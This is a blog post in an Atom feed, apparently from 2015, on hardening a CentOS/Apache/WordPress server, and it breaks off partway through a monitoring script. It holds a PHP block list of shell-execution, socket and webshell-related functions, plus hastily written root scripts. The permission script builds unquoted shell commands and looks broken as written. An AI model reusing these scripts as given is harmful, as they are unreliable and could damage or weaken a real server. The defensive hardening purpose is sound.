<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Linux | ZeroDay Cyber Research]]></title>
  <link href="http://z3r0d4y.com/blog/categories/linux/atom.xml" rel="self"/>
  <link href="http://z3r0d4y.com/"/>
  <updated>2015-02-24T08:24:57-05:00</updated>
  <id>http://z3r0d4y.com/</id>
  <author>
    <name><![CDATA[Ali Razmjoo]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How to Setup Secure Website for Hackers]]></title>
    <link href="http://z3r0d4y.com/blog/2015/02/04/how-to-setup-secure-website-for-hackers/"/>
    <updated>2015-02-04T11:00:45-05:00</updated>
    <id>http://z3r0d4y.com/blog/2015/02/04/how-to-setup-secure-website-for-hackers</id>
    <content type="html"><![CDATA[<p>When security researchers and hackers want to setup a self blog the biggest stress on their brain is what to do for secure their server and site. what if someone come and naughty their servers ? what if server get DDOS attack when they don’t have access to fix up their server and they are outside on travel or maybe with their girl friend ? o.O first mistake , Hackers , Geeks , Programmers and security researchers often don’t have girl friend so we skip this reason and replace it with maybe they go for business or something and they cann&rsquo;t access their server for some reason. After some years that I spent my life on information security I release that nothing cannot be secure 100% , But We shouldn&rsquo;t give it up and let others naughty our server and deface our website or maybe make a botnet zombie for DDOS Attack. In past year I decision to do something to remove this stress on my self or make it less and I start to make a mini firewall or something like Robot for secure my server because I don’t trust other firewalls. 99% of firewalls bypass easy and it’s really ridicule that big firewalls from big company mostly skip checking the packets on POST requests. So it’s first reason I decision to secure my server by my own scripts, So keep reading to know more.</p>




<!-- more -->




<p>At first We must to know , what do we have and what do we want? my first decision to secure my website is that I build my website on my own VPS and don&rsquo;t share VPS with anyone else, so Don’t use a share hosting for your site if it’s important for you and by the way this method I want to talk about cann&rsquo;t be use for share hosting and it will make you in trouble if you share your VPS with someone else. Second decision is choose a operation system and a website platform for yourself, I chosen CentOS for my Server OS and WordPress for my blogging. Notice , you can choose anything but after you read this article you must to know how edit source codes and match them with other website platform or OS. By the way I get a VPS that have a Console Access [Hardware Access + Emergency SSH or Emergency VNC] and I install a Panel [ For Example <a href="http://cpanel.net/">CPanel X (WHM/CPANEL)</a> ] and panel installer will automatically install anything  that need to be install on Server. That was first Step for lazy guys and if you like , you can install anything you need with terminal on SSH or anyway you like. Just setup your website and after That install your Wordpress [or anything you want]. Okay Here we go. Now what you need to Secure:
<br>1- WebServer
<br>2- Your Blogging(or maybe forum or &hellip;) Platform
<br>3- PHP
<br>4- Set Permissions
<br>5- Make a Mini Robot And a mini WAF
<br>6- Other Service if you use [For Example SSH , I will explain this in at the end of this article]</p>




<p>For begining I&rsquo;ve to say i don&rsquo;t want to teach from begining of securing or config server so you most have little knowlage when you reading this article and for secure your Webserver if you using Apache [httpd] you really need to install <a href="http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/">Anti Slowloris</a> first. Maybe you hear <a href="http://ha.ckers.org/slowloris/slowloris.pl">Slowloris</a> before it&rsquo;s a <a href="http://ha.ckers.org/slowloris/slowloris.pl">DDOSER Script</a>  and easily can take down the Apache webserver. So now how to install This ?
<br>Fallow these commands:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mkdir zeroday
</span><span class='line'><span class="nb">cd </span>zeroday
</span><span class='line'>wget http://sourceforge.net/projects/mod-antiloris/files/mod_antiloris-0.4.tar.bz2/download
</span><span class='line'>tar -xvjf mod_antiloris-0.4.tar.bz2
</span><span class='line'><span class="nb">cd </span>mod_antiloris-0.4
</span><span class='line'>apxs -a -i -c mod_antiloris.c
</span><span class='line'>service httpd restart
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>If your Centos Doesn&rsquo;t have apxs so you need to fallow these commands:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install php-pear
</span><span class='line'>yum install php-devel
</span><span class='line'>yum install httpd-devel
</span><span class='line'>pecl install apc
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;extension=apc.so&quot;</span> &gt; /etc/php.d/apc.ini
</span><span class='line'>service httpd restart
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And again if show you any error about php-devel or httpd-devel don&rsquo;t give up and install these from rpm packages From <a href="http://vault.centos.org/5.3/updates/x86_64/RPMS/">vault.centos.org</a>.<br></p>




<p>The next step for config your webserver ,You need to off the webserver signature to don&rsquo;t get others much information about webserver modules.
so find the httpd.conf and then open it and search the &ldquo;ServerSignature On&rdquo; , replace with &ldquo;ServerSignature Off&rdquo; and add &ldquo;ServerTokens Prod&rdquo; or &ldquo;ServerTokens Email&rdquo; [Webmaster or Admin Email].</p>




<p>For next Step is Disable the CGI and Directory Listing and you need to Add &ldquo;Options  -Indexes -ExecCGI &hellip;&rdquo; , If you do it before you know how to add these and if not beginners can learn from this <a href="http://www.petefreitag.com/item/505.cfm">URL</a>.</p>




<p>Notice: In that url I shared for beginners said about &ldquo;mod_security&rdquo; and I suggest you don&rsquo;t install or active it, sometimes it&rsquo;s not good for poor servers and in DDOS attacks it will help for make website go offline [On Crash or Use much system processing].</p>




<p>And now PHP config time,  all you need is set some disable functions and turn on safe mode and disable errors to not show path and user, and other one is to disallow url opening with fopen.
I just made a list for disable function you can use it.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">socket_last_error</span><span class="p">,</span><span class="nb">pcntl_wexitstatus</span><span class="p">,</span><span class="nb">socket_recvfrom</span><span class="p">,</span><span class="nb">pcntl_wifexited</span><span class="p">,</span><span class="nb">socket_getpeername</span><span class="p">,</span><span class="nb">posix_mknod</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">,</span><span class="nb">pcntl_wtermsig</span><span class="p">,</span><span class="nb">imap_list</span><span class="p">,</span><span class="nb">php_uname</span><span class="p">,</span><span class="nb">openlog</span><span class="p">,</span><span class="nb">stream_socket_client</span><span class="p">,</span><span class="nb">imap_open</span><span class="p">,</span><span class="nb">socket_create</span><span class="p">,</span><span class="nb">proc_get_status</span><span class="p">,</span><span class="nb">posix_isatty</span><span class="p">,</span><span class="nx">group</span><span class="p">,</span><span class="nb">stream_copy_to_stream</span><span class="p">,</span><span class="nb">posix_getrlimit</span><span class="p">,</span><span class="nb">fwrite</span><span class="p">,</span><span class="nb">pfsockopen</span><span class="p">,</span><span class="nx">pfsockopenproc_nice</span><span class="p">,</span><span class="nb">is_writable</span><span class="p">,</span><span class="nb">socket_write</span><span class="p">,</span><span class="nb">socket_read</span><span class="p">,</span><span class="nb">posix_mkfifo</span><span class="p">,</span><span class="nb">posix_initgroups</span><span class="p">,</span><span class="nb">stream_get_wrappers</span><span class="p">,</span><span class="nb">dl</span><span class="p">,</span><span class="nb">posix_getpwnam</span><span class="p">,</span><span class="nb">posix_getgrgid</span><span class="p">,</span><span class="nb">stream_filter_append</span><span class="p">,</span><span class="nb">posix_getgid</span><span class="p">,</span><span class="nb">posix_getcwd</span><span class="p">,</span><span class="nb">posix_getgroups</span><span class="p">,</span><span class="nb">chmod</span><span class="p">,</span><span class="nb">socket_set_block</span><span class="p">,</span><span class="nb">pcntl_wstopsig</span><span class="p">,</span><span class="nx">socket_writereadlink</span><span class="p">,</span><span class="nb">stream_set_blocking</span><span class="p">,</span><span class="nb">stream_context_create</span><span class="p">,</span><span class="nb">rewinddir</span><span class="p">,</span><span class="nb">proc_terminate</span><span class="p">,</span><span class="nb">stream_get_filters</span><span class="p">,</span><span class="nb">pcntl_signal</span><span class="p">,</span><span class="nx">dlopenlog</span><span class="p">,</span><span class="nb">stream_select</span><span class="p">,</span><span class="nb">curl_getinfo</span><span class="p">,</span><span class="nb">posix_geteuid</span><span class="p">,</span><span class="nb">stream_socket_recvfrom</span><span class="p">,</span><span class="nb">error_log</span><span class="p">,</span><span class="nb">socket_select</span><span class="p">,</span><span class="nb">shell_exec</span><span class="p">,</span><span class="nb">apache_getenv</span><span class="p">,</span><span class="nb">gzinflate</span><span class="p">,</span><span class="nb">dir</span><span class="p">,</span><span class="nb">posix_getpwuid</span><span class="p">,</span><span class="nb">tmpfile</span><span class="p">,</span><span class="nx">GETCWD</span><span class="p">(),</span><span class="nb">stream_resolve_include_path</span><span class="p">,</span><span class="nb">socket_clear_error</span><span class="p">,</span><span class="nb">pcntl_wifstopped</span><span class="p">,</span><span class="nb">syslog</span><span class="p">,</span><span class="nb">stream_context_set_option</span><span class="p">,</span><span class="nb">stream_socket_accept</span><span class="p">,</span><span class="nb">getmypid</span><span class="p">,</span><span class="nx">cpanel_check</span><span class="p">,</span><span class="nb">stream_socket_shutdown</span><span class="p">,</span><span class="nb">apache_note</span><span class="p">,</span><span class="nx">purepass</span><span class="p">,</span><span class="nb">posix_getsid</span><span class="p">,</span><span class="nx">leak</span><span class="p">,</span><span class="nb">phpinfo</span><span class="p">,</span><span class="nb">stream_socket_pair</span><span class="p">,</span><span class="nb">posix_setegid</span><span class="p">,</span><span class="nb">socket_set_nonblock</span><span class="p">,</span><span class="nx">reg_glob</span><span class="p">,</span><span class="nb">escapeshellcmd</span><span class="p">,</span><span class="nb">gzuncompress</span><span class="p">,</span><span class="nx">pureuser</span><span class="p">,</span><span class="nb">show_source</span><span class="p">,</span><span class="nb">apache_get_version</span><span class="p">,</span><span class="nb">posix_getlogin</span><span class="p">,</span><span class="nb">posix_ctermid</span><span class="p">,</span><span class="nb">posix_kill</span><span class="p">,</span><span class="nb">socket_accept</span><span class="p">,</span><span class="nb">posix_getppid</span><span class="p">,</span><span class="nb">symlink</span><span class="p">,</span><span class="nx">timearray</span><span class="p">,</span><span class="nb">pcntl_waitpid</span><span class="p">,</span><span class="nb">getmygid</span><span class="p">,</span><span class="nb">posix_ttyname</span><span class="p">,</span><span class="nb">diskfreespace</span><span class="p">,</span><span class="nb">popen</span><span class="p">,</span><span class="nb">stream_socket_sendto</span><span class="p">,</span><span class="nb">apache_setenv</span><span class="p">,</span><span class="nb">stream_context_set_params</span><span class="p">,</span><span class="nb">stream_filter_register</span><span class="p">,</span><span class="nb">posix_access</span><span class="p">,</span><span class="nb">socket_set_option</span><span class="p">,</span><span class="nb">stream_context_get_default</span><span class="p">,</span><span class="nb">posix_errno</span><span class="p">,</span><span class="nb">posix_times</span><span class="p">,</span><span class="nb">posix_setuid</span><span class="p">,</span><span class="nb">socket_get_option</span><span class="p">,</span><span class="nx">ftp_check</span><span class="p">,</span><span class="nb">stream_socket_enable_crypto</span><span class="p">,</span><span class="nx">port_bind_bd_c</span><span class="p">,</span><span class="nb">proc_open</span><span class="p">,</span><span class="nb">pcntl_wifsignaled</span><span class="p">,</span><span class="nx">proc_deutf</span><span class="p">,</span><span class="nb">posix_seteuid</span><span class="p">,</span><span class="nb">posix_uname</span><span class="p">,</span><span class="nb">get_current_user</span><span class="p">,</span><span class="nb">socket_create_pair</span><span class="p">,</span><span class="nb">proc_nice</span><span class="p">,</span><span class="nb">curl_errno</span><span class="p">,</span><span class="nx">socket_sendsocket_sendto</span><span class="p">,</span><span class="nb">mkdir</span><span class="p">,</span><span class="nb">system</span><span class="p">,</span><span class="nb">stream_get_line</span><span class="p">,</span><span class="nb">posix_getpid</span><span class="p">,</span><span class="nb">highlight_file</span><span class="p">,</span><span class="nb">socket_create_listen</span><span class="p">,</span><span class="nb">mysql_list_dbs</span><span class="p">,</span><span class="nx">listen</span><span class="p">,</span><span class="nb">imap_body</span><span class="p">,</span><span class="nx">shell</span><span class="p">,</span><span class="nb">ini_alter</span><span class="p">,</span><span class="nb">posix_setpgid</span><span class="p">,</span><span class="nb">socket_bind</span><span class="p">,</span><span class="nb">link</span><span class="p">,</span><span class="nb">getmyuid</span><span class="p">,</span><span class="nb">posix_getpgid</span><span class="p">,</span><span class="nb">ini_restore</span><span class="p">,</span><span class="nb">posix_setsid</span><span class="p">,</span><span class="nb">stream_set_write_buffer</span><span class="p">,</span><span class="nb">posix_getegid</span><span class="p">,</span><span class="nx">eof_ctrl_dir</span><span class="p">,</span><span class="nb">getrusage</span><span class="p">,</span><span class="nb">stream_set_timeout</span><span class="p">,</span><span class="nb">ini_get_all</span><span class="p">,</span><span class="nb">apache_get_modules</span><span class="p">,</span><span class="nb">stream_socket_server</span><span class="p">,</span><span class="nb">stream_filter_remove</span><span class="p">,</span><span class="nb">posix_setgid</span><span class="p">,</span><span class="nb">proc_close</span><span class="p">,</span><span class="nb">socket_shutdown</span><span class="p">,</span><span class="nb">socket_listen</span><span class="p">,</span><span class="nb">stream_encoding</span><span class="p">,</span><span class="nb">posix_getgrnam</span><span class="p">,</span><span class="nb">stream_wrapper_unregister</span><span class="p">,</span><span class="nb">stream_get_meta_data</span><span class="p">,</span><span class="nx">getmicrotime</span><span class="p">,</span><span class="nb">fpassthru</span><span class="p">,</span><span class="nb">socket_recv</span><span class="p">,</span><span class="k">virtual</span><span class="p">,</span><span class="nb">chgrp</span><span class="p">,</span><span class="nx">presets_rlph</span><span class="p">,</span><span class="nb">posix_getuid</span><span class="p">,</span><span class="nb">stream_filter_prepend</span><span class="p">,</span><span class="nb">stream_get_transports</span><span class="p">,</span><span class="nb">stream_context_get_options</span><span class="p">,</span><span class="nb">set_time_limit</span><span class="p">,</span><span class="nb">exec</span><span class="p">,</span><span class="nb">posix_getpgrp</span><span class="p">,</span><span class="nb">stream_register_wrapper</span><span class="p">,</span><span class="nb">stream_socket_get_name</span><span class="p">,</span><span class="nb">stream_bucket_new</span><span class="p">,</span><span class="nb">posix_get_last_error</span><span class="p">,</span><span class="nb">gethostbyname</span><span class="p">,</span><span class="nb">getcwd</span><span class="p">(),</span><span class="nb">chroot</span><span class="p">,</span><span class="nb">socket_close</span><span class="p">,</span><span class="nb">escapeshellarg</span><span class="p">,</span><span class="nb">fsockopen</span><span class="p">,</span><span class="nb">passthru</span><span class="p">,</span><span class="nb">stream_wrapper_register</span><span class="p">,</span><span class="nb">socket_strerror</span><span class="p">,</span><span class="nb">stream_get_contents</span><span class="p">,</span><span class="nb">stream_wrapper_restore</span><span class="p">,</span><span class="nb">pcntl_exec</span><span class="p">,</span><span class="nb">socket_connect</span><span class="p">,</span><span class="nb">stream_bucket_prepend</span><span class="p">,</span><span class="nb">chown</span><span class="p">,</span><span class="nb">posix_strerror</span><span class="p">,</span><span class="nb">curl_multi_exec</span><span class="p">,</span><span class="nb">pcntl_fork</span><span class="p">,</span><span class="nb">apache_child_terminate</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>and  beginners can check <a href="http://www.madirish.net/199">HERE</a> for how to do things I said.</p>




<p>Until now anything I said was simple and not any special things and also maybe easy to bypass, But don’t hurry up. let me explain more and then we continue. With that disable functions and php config we disabled the RCE vulnerabilities and something more that you know they appear with those functions, And now first copy this python script in your public_html and run it. It’s going to change file and folder permissions [remove write permission]. So after you setup your website and finish you must close write permission on every folder and files in public_html. On this way no one cannot upload anything on your website and if you want to upload anything you have to upload on database or if want to upload in the public_html folder you must open permission for seconds and upload your files and close it again, Now We know that uploading and file wrting begin disable on our server in easy way.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Perm.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/perm.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="c">#Ali Razmjoo</span>
</span><span class='line'><span class="k">for</span> <span class="n">dirname</span><span class="p">,</span> <span class="n">dirnames</span><span class="p">,</span> <span class="n">filenames</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="s">&#39;/home/zeroday/public_html/&#39;</span><span class="p">):</span> <span class="c">#change directory or copy file to public_html directory and set directory (&#39;.&#39;)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">subdirname</span> <span class="ow">in</span> <span class="n">dirnames</span><span class="p">:</span>
</span><span class='line'>                <span class="n">f</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="n">subdirname</span><span class="p">)</span>
</span><span class='line'>                <span class="n">f</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
</span><span class='line'>                <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#39;chmod 555 &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="c">#555 Perm for Folders</span>
</span><span class='line'>                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">filenames</span><span class="p">:</span>
</span><span class='line'>                <span class="n">f</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
</span><span class='line'>                <span class="n">f</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
</span><span class='line'>                <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#39;chmod 444 &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="c">#444 Perm for Files</span>
</span><span class='line'>                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Note: This script set 555 permission for folders and 444 for files.
<br>Note: All scripts not coded in professional coding mode so take it easy. I wrote them so fast.</p>




<p>Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?
<b>1- Check for DDOS attack from inside and outside
<br>2- Check MD5 for public_html files
<br>And now about source codes and explain. first you must create file with name “zeroday” in /etc/init.d/ zeroday is begin your service name. [work with command “service zeroday start/stop”] and here is sourcode code
<br>Note: You can choose a different service name [&lsquo;zeroday&rsquo; or anything you like]</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>zeroday</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'><span class="c">#found on google</span>
</span><span class='line'><span class="nv">WORK_DIR</span><span class="o">=</span><span class="s2">&quot;/var/lib/foo&quot;</span>
</span><span class='line'><span class="nv">DAEMON</span><span class="o">=</span><span class="s2">&quot;/usr/bin/python&quot;</span>
</span><span class='line'><span class="nv">ARGS</span><span class="o">=</span><span class="s2">&quot;/root/zeroday.py&quot;</span>
</span><span class='line'><span class="nv">PIDFILE</span><span class="o">=</span><span class="s2">&quot;/var/run/foo.pid&quot;</span>
</span><span class='line'><span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;root&quot;</span> <span class="c">#you must run this process as root</span>
</span><span class='line'><span class="nv">KILL</span><span class="o">=</span><span class="s2">&quot;/root/kill.py&quot;</span>
</span><span class='line'><span class="k">case</span> <span class="s2">&quot;$1&quot;</span> in
</span><span class='line'>  start<span class="o">)</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s2">&quot;Starting server&quot;</span>
</span><span class='line'>    mkdir -p <span class="s2">&quot;$WORK_DIR&quot;</span>
</span><span class='line'>    start-stop-daemon  --start --pidfile <span class="nv">$PIDFILE</span> <span class="se">\ </span>
</span><span class='line'>        --user <span class="nv">$USER</span> <span class="se">\</span>
</span><span class='line'>        -b --make-pidfile <span class="se">\</span>
</span><span class='line'>        --chuid <span class="nv">$USER</span> <span class="se">\</span>
</span><span class='line'>        --exec <span class="nv">$DAEMON</span> <span class="nv">$ARGS</span>
</span><span class='line'>   <span class="p">;;</span>
</span><span class='line'>  stop<span class="o">)</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s2">&quot;Stopping server&quot;</span>
</span><span class='line'>    start-stop-daemon --stop --pidfile <span class="nv">$PIDFILE</span> --verbose
</span><span class='line'>  python <span class="nv">$KILL</span>
</span><span class='line'>    <span class="p">;;</span>
</span><span class='line'>  *<span class="o">)</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s2">&quot;Usage: /etc/init.d/$USER {start|stop}&quot;</span>
</span><span class='line'>    <span class="nb">exit </span>1
</span><span class='line'>    <span class="p">;;</span>
</span><span class='line'><span class="k">esac</span>
</span><span class='line'><span class="nb">exit </span>0
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Explain this code:
<br>I found this code in google and it&rsquo;s gonna help us make a service very easy on linux.
<br>Look at this like:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">ARGS</span><span class="o">=</span><span class="s2">&quot;/root/zeroday.py&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>zeroday.py is main starting script of robot.</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">KILL</span><span class="o">=</span><span class="s2">&quot;/root/kill.py&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>kill.py execute when we want stop robot[service].
<br>Note: You must create these files in same directory or change directory in service bash script.
<br>Note: As you see in line 12 , we must install &lsquo;start-stop-daemon&rsquo; so download and install it.
<br>Daemon Download:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget https://raw.githubusercontent.com/Ali-Razmjoo/z3r0d4y/master/daemon.zip
</span><span class='line'>unzip daemon.zip
</span><span class='line'><span class="nb">cd </span>daemon
</span><span class='line'>make
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And if you get any error, you don&rsquo;t have gcc so:</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install gcc
</span><span class='line'>gcc start-stop-daemon.c -o start-stop-daemon
</span><span class='line'>cp start-stop-daemon /usr/sbin/
</span><span class='line'>chmod <span class="m">755</span> /usr/sbin/start-stop-daemon
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>And daemon installed.<br>
Now the main python file for start all subprocess together.
source code :</p>




<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>zeroday.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="c">#Ali Razmjoo </span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
</span><span class='line'><span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span><span class='line'>    <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span><span class='line'><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">stop</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span> <span class="c">#start software</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span> <span class="c">#while bash script not stop ....</span>
</span><span class='line'>      <span class="n">subpro_in</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="s">&#39;/root/in.py&#39;</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
</span><span class='line'>      <span class="n">pid_in</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_in</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
</span><span class='line'>      <span class="n">subpro_out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="s">&#39;/root/out.py&#39;</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
</span><span class='line'>      <span class="n">pid_out</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_out</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
</span><span class='line'>      <span class="n">subpro_24</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="s">&#39;/root/24ban.py&#39;</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
</span><span class='line'>      <span class="n">pid_24</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_24</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>        
</span><span class='line'>      <span class="n">subpro_md5</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="s">&#39;/root/md5.py&#39;</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
